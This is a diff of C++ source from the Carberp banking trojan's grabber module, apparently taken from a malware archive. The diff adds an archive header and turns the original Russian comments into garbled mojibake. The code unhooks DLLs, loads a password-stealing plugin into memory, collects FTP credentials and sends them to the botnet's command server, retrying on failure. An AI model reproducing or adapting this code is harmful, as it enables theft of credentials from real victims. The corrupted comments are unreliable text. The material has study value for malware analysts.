@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "BotCore.h"
@@ -26,7 +37,7 @@ namespace Grabber
  
 bool ExecuteGrabber(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
-	// Запустить поток грабера. Доступна только при включенном модуле грабера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	return TwiceJumpSelf(GrabberThread);
 }
 
@@ -43,7 +54,7 @@ DWORD WINAPI GrabberThread( LPVOID lpData )
 	return 0;*/
 	UnhookDlls();
 
-	// Загружаем плагин
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
    //	const static char GrabberFile[] = {'/','c','f','g','/','p','a','s','s','w','.','p','l','u','g',0};
 
    const static char GrabberPlugin[] = {'p','a','s','s','w','.','p','l','u','g',0};
@@ -53,7 +64,7 @@ DWORD WINAPI GrabberThread( LPVOID lpData )
 
 	//bool bKnock = false;
 
-    // Выполняем плагин
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HMEMORYMODULE Lib = MemoryLoadLibrary(Module);
 
 	if (Lib == NULL) return 0;
@@ -69,7 +80,7 @@ DWORD WINAPI GrabberThread( LPVOID lpData )
 
 	PCHAR Buffer = FtpGrabber();
 
-    // Отправляем данные
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Size = StrCalcLength(Buffer);
 
 	if (Size != 0)
@@ -79,7 +90,7 @@ DWORD WINAPI GrabberThread( LPVOID lpData )
 		bool Sended = false;
 		do
 		{
-			// Отправляем данные на сервер
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			PCHAR ReportURL = GetBotScriptURL(SCRIPT_GRABBER);
 			Sended = SendGrabberReport(ReportURL, Buffer, Size);
 			if (!Sended) pSleep(60000);
